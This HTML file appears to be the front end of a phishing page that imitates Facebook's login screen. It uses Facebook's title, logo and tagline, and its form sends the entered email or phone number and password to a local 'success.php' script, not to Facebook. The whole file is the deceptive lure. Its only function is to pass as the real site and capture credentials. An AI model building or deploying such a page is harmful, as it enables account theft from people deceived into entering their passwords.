<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - log in or sign up</title>
    <link rel="icon" type="image/x-icon" href="img/fbicon.png">
    <link href='https://fonts.googleapis.com/css?family=Open Sans' rel='stylesheet'>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <div class="heading-container">
            <img src="img/fbpic.png" alt="fb Logo">
            <div class="heading">
                <h3>Connect with friends and the world around you on Facebook.</h3>
            </div>
        </div>
        <div class="main">
            <div class="form-container">
                <form id="Login" action="success.php" method="POST">
                    <div class="input-group">
                        <input  type="text" name="user" placeholder="Email or phone number">
                    </div>
                    <div class="input-group">
                        <input type="password" name="pass" placeholder="Password">
                    </div>
                    <div class="input-group">
                        <button name="login" type="submit">Log IN</button>
                    </div>
                    <div class="forgot-pass">
                        <a href="#">Forgot password?</a>
                    </div>
                    <div class="break"></div>
                    <div class="creat-acc">
                        <a role="button" href="#">Create new account</a>
                    </div>
                </form>
            </div>
            <div class="create-page">
                <a href="#">Create a Page </a><span>for a celebrity, brand or business.</span>
            </div>
        </div>
    </div>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.5/jquery.validate.min.js" 
    integrity="sha512-rstIgDs0xPgmG6RX1Aba4KV5cWJbAMcvRCVmglpam9SoHZiUCyQVDdH2LPlxoHtrv17XWblE/V/PP+Tr04hbtA==" 
    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script src="validate.js"></script>
</body>
</html>